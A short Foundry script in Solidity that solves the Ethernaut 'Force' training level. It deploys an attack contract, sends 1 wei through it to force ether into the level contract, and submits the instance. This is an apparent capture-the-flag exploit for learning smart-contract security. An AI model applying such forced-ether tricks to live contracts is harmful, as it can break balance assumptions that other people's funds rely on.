// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Force} from "../src/Level07.sol";
import {Attack} from "../src/Level07Attack.sol";

contract Level07 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Force instance = Force(vm.envAddress("LVL07_ADDR"));
        Attack attack = new Attack();
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        attack.attack{value: 1 wei}(payable(address(instance)));

        uint256 balance = address(instance).balance;
        console2.log("balance: ", balance);
        if (balance == 0) {
            console2.log("Level07: Failed");
        } else {
            console2.log("Level07: Success");
            ethernaut.submitLevelInstance(address(instance));
        }

        vm.stopBroadcast();
    }
}
